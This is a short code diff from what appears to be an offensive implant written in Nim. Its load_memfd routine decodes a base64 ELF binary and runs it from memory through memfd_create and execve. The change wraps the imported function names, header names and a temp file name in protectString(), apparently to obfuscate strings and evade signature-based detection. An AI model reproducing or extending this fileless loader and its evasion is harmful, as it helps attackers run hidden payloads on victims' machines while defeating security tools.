@@ -4,9 +4,9 @@ import strutils
 import posix
 import os
 
-proc execve(pathname: cstring, argv: ptr cstring, envp: cstring): cint {.nodecl, importc: "execve", header: "<stdlib.h>".}
-proc memfd_create(name: cstring, flags: cint): cint {.header: "<sys/mman.h>", importc: "memfd_create".}
-proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc, header: "unistd.h".}
+proc execve(pathname: cstring, argv: ptr cstring, envp: cstring): cint {.nodecl, importc: protectString("execve"), header: "<stdlib.h>".}
+proc memfd_create(name: cstring, flags: cint): cint {.header: protectString("<sys/mman.h>"), importc: protectString("memfd_create").}
+proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc, header: protectString("unistd.h").}
 
 proc load_memfd*(elf_base64: string, command_line: string, is_task=false): (bool, string) =
     #[
@@ -17,7 +17,7 @@ proc load_memfd*(elf_base64: string, command_line: string, is_task=false): (bool
     ]#
 
     # only needed if is_task = true
-    var redirect_filepath = getTempDir() / "r.o"
+    var redirect_filepath = getTempDir() / protectString("r.o")
 
     # decode elf buffer
     let elf_buffer = decode_64(elf_base64, is_bin=true, encoding="UTF-8")
